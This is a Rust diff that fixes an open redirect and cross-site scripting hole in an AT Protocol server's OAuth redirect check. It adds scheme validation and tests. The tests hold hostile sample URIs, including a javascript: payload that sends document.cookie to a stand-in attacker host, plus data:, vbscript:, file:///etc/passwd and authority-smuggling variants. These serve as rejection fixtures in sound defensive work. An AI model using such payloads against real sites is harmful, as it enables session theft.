@@ -184,6 +184,20 @@ pub enum ClientMetadataError {
         /// The redirect the caller asked for.
         redirect_uri: String,
     },
+
+    /// The redirect is one the specification does not permit, whatever the
+    /// client declared.
+    #[error(
+        "error-atproto-pds-oauth-6 redirect_uri not permitted for client: {client_id} {redirect_uri}: {details}"
+    )]
+    RedirectUriNotPermitted {
+        /// The client whose metadata was consulted.
+        client_id: String,
+        /// The redirect the caller asked for.
+        redirect_uri: String,
+        /// Which rule it broke.
+        details: String,
+    },
 }
 
 /// True when `client_id` names a loopback client rather than a discoverable one.
@@ -377,22 +391,220 @@ pub fn assert_redirect_uri_registered(
     metadata: &ClientMetadata,
     redirect_uri: &str,
 ) -> Result<(), ClientMetadataError> {
-    if metadata
+    if !metadata
         .redirect_uris
         .iter()
         .any(|registered| registered == redirect_uri)
     {
-        return Ok(());
+        return Err(ClientMetadataError::RedirectUriNotRegistered {
+            client_id: client_id.to_string(),
+            redirect_uri: redirect_uri.to_string(),
+        });
     }
-    Err(ClientMetadataError::RedirectUriNotRegistered {
+    assert_redirect_uri_permitted(client_id, redirect_uri)
+}
+
+/// Reject a redirect the specification does not permit, however the client
+/// declared it.
+///
+/// Registration is a client asserting where *it* wants codes sent; it is not
+/// the client vouching for the URL being a URL. Membership in the published
+/// list was the only check here, so a `client_id` document declaring
+/// `"redirect_uris": ["javascript:..."]` passed, and the consent page assigns
+/// the result to `window.location` -- executing the attacker's script in this
+/// server's origin, where the portal session cookie lives. Appending
+/// `?code=...` does not defuse it: `javascript:fetch(...);//` comments the
+/// suffix out.
+///
+/// The permitted shapes, from the AT Protocol OAuth specification:
+///
+/// - `https://` -- the ordinary web and native case.
+/// - `http://` only at loopback, `127.0.0.1` or `[::1]`, the development
+///   exception. Note the asymmetry with a loopback *`client_id`*, which must
+///   be `localhost` and not an address literal; these are different rules for
+///   different fields and the spec states both.
+/// - A private-use scheme, which "must match the `client_id` hostname in
+///   reverse-domain order" -- `https://app.example.com/...` admits
+///   `com.example.app:/callback` and nothing else -- written as a single colon,
+///   a single slash, and a path, so there is no authority component to confuse
+///   with a host.
+///
+/// Everything else is refused, which is what keeps `javascript:`, `data:`,
+/// `file:` and `vbscript:` out rather than enumerating them.
+///
+/// # Errors
+///
+/// Returns [`ClientMetadataError::RedirectUriNotPermitted`] with the rule that
+/// was broken.
+fn assert_redirect_uri_permitted(
+    client_id: &str,
+    redirect_uri: &str,
+) -> Result<(), ClientMetadataError> {
+    let refuse = |details: String| ClientMetadataError::RedirectUriNotPermitted {
         client_id: client_id.to_string(),
         redirect_uri: redirect_uri.to_string(),
-    })
+        details,
+    };
+
+    let url =
+        url::Url::parse(redirect_uri).map_err(|e| refuse(format!("not a parseable URI: {e}")))?;
+
+    match url.scheme() {
+        "https" => Ok(()),
+        "http" => match url.host() {
+            Some(url::Host::Ipv4(addr)) if addr.is_loopback() => Ok(()),
+            Some(url::Host::Ipv6(addr)) if addr.is_loopback() => Ok(()),
+            _ => Err(refuse(
+                "http is permitted only at the 127.0.0.1 or [::1] loopback".to_string(),
+            )),
+        },
+        scheme => {
+            // A private-use scheme carries no authority, so anything that
+            // parsed a host is not one -- `com.example.app://evil.test/cb`
+            // reads as the app's scheme while pointing somewhere else.
+            if url.host().is_some() {
+                return Err(refuse(format!(
+                    "private-use scheme {scheme} must not carry an authority component"
+                )));
+            }
+            if !url.path().starts_with('/') {
+                return Err(refuse(format!(
+                    "private-use scheme {scheme} must be followed by a single slash and a path"
+                )));
+            }
+            let host = url::Url::parse(client_id)
+                .ok()
+                .and_then(|u| u.host_str().map(str::to_string))
+                .ok_or_else(|| {
+                    refuse("client_id has no host to derive a scheme from".to_string())
+                })?;
+            let expected = host.split('.').rev().collect::<Vec<_>>().join(".");
+            if scheme == expected {
+                Ok(())
+            } else {
+                Err(refuse(format!(
+                    "private-use scheme must be {expected}, the client_id host in reverse-domain order, not {scheme}"
+                )))
+            }
+        }
+    }
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// The attack the scheme check exists for: a client declaring a
+    /// `javascript:` redirect passed registration, and the consent page assigns
+    /// what comes back to `window.location` -- running it in this server's
+    /// origin, where the portal session cookie lives.
+    #[test]
+    fn a_declared_javascript_redirect_is_refused() {
+        let hostile = "javascript:fetch('https://evil.example/?'+document.cookie);//";
+        let metadata = metadata_with(&[hostile]);
+        let err = assert_redirect_uri_registered(
+            "https://app.example.com/client-metadata.json",
+            &metadata,
+            hostile,
+        )
+        .expect_err("a javascript: redirect must never be accepted");
+        assert!(
+            matches!(err, ClientMetadataError::RedirectUriNotPermitted { .. }),
+            "expected a permission refusal, got {err:?}"
+        );
+    }
+
+    /// Declaring it is not the same as being allowed it, for every scheme that
+    /// executes or embeds rather than navigates.
+    #[test]
+    fn declared_but_impermissible_schemes_are_all_refused() {
+        for hostile in [
+            "javascript:alert(1)",
+            "data:text/html,<script>alert(1)</script>",
+            "vbscript:msgbox(1)",
+            "file:///etc/passwd",
+            // Cleartext off-loopback: the code would cross the network in the
+            // clear even though nothing executes.
+            "http://app.example.com/callback",
+        ] {
+            let metadata = metadata_with(&[hostile]);
+            let err = assert_redirect_uri_registered(
+                "https://app.example.com/client-metadata.json",
+                &metadata,
+                hostile,
+            )
+            .expect_err("{hostile} must be refused");
+            assert!(
+                matches!(err, ClientMetadataError::RedirectUriNotPermitted { .. }),
+                "{hostile}: expected a permission refusal, got {err:?}"
+            );
+        }
+    }
+
+    /// The shapes the specification does permit have to keep working, or the
+    /// check is an outage rather than a fix.
+    #[test]
+    fn the_permitted_shapes_are_accepted() {
+        for (client_id, uri) in [
+            (
+                "https://app.example.com/client-metadata.json",
+                "https://app.example.com/callback",
+            ),
+            // A private-use scheme in reverse-domain order.
+            (
+                "https://app.example.com/client-metadata.json",
+                "com.example.app:/callback",
+            ),
+            // The loopback development exception, which uses address literals
+            // even though a loopback `client_id` must use `localhost`.
+            ("http://localhost", "http://127.0.0.1/"),
+            ("http://localhost", "http://[::1]/"),
+        ] {
+            let metadata = metadata_with(&[uri]);
+            assert_redirect_uri_registered(client_id, &metadata, uri)
+                .unwrap_or_else(|e| panic!("{client_id} should admit {uri}: {e}"));
+        }
+    }
+
+    /// A private-use scheme that is not the client's own domain reversed, or
+    /// that smuggles an authority, is somebody else's redirect wearing the
+    /// app's scheme.
+    #[test]
+    fn a_private_use_scheme_must_be_the_clients_own_domain_reversed() {
+        for hostile in [
+            "com.attacker.app:/callback",
+            "com.example.app://evil.test/callback",
+        ] {
+            let metadata = metadata_with(&[hostile]);
+            let err = assert_redirect_uri_registered(
+                "https://app.example.com/client-metadata.json",
+                &metadata,
+                hostile,
+            )
+            .expect_err("{hostile} must be refused");
+            assert!(
+                matches!(err, ClientMetadataError::RedirectUriNotPermitted { .. }),
+                "{hostile}: expected a permission refusal, got {err:?}"
+            );
+        }
+    }
+
+    /// An unregistered redirect still fails as unregistered, so the new check
+    /// has not swallowed the older one.
+    #[test]
+    fn an_unregistered_redirect_still_reports_as_unregistered() {
+        let metadata = metadata_with(&["https://app.example.com/callback"]);
+        let err = assert_redirect_uri_registered(
+            "https://app.example.com/client-metadata.json",
+            &metadata,
+            "https://app.example.com/other",
+        )
+        .expect_err("an unregistered redirect must be refused");
+        assert!(
+            matches!(err, ClientMetadataError::RedirectUriNotRegistered { .. }),
+            "expected a registration refusal, got {err:?}"
+        );
+    }
 
     fn metadata_with(uris: &[&str]) -> ClientMetadata {
         ClientMetadata {
